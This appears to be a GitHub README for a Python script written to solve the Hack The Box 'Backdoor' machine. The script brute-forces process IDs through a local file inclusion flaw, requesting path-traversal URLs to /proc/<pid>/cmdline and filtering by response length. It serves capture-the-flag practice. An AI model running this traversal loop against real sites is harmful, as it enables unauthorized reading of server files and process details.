# PID-bruteforce-via-LFI

## Vulnerability
I wrote this python script to help solve the backdoor machine in Hack The Box. The script was used for a brute forcing PID via LFI vulnerability. 


### Tool Overview

The tool Brute-force multiple requests trying a range of numbers for all the PID in the proc directory and filter the results based on the responses length  .

### How to Setup:
1. Change the URL paramenter with the LFI vulnerable site`

```py

for x in range(0,10000):

	url = "http://VULNERABLE.SITE.URL/../../../../../../proc/"+ str(x) +"/cmdline"
	r = requests.get(url)
	
```         

### Usage:
Use this command to run the python tool you just setup:

`Python3 File-Name.py`


| Screenshot |
|------------|
|![Screenshot](![PID](https://user-images.githubusercontent.com/68829493/155852527-175a99b4-60d4-4704-9033-fb59b04c2fb5.png)
)






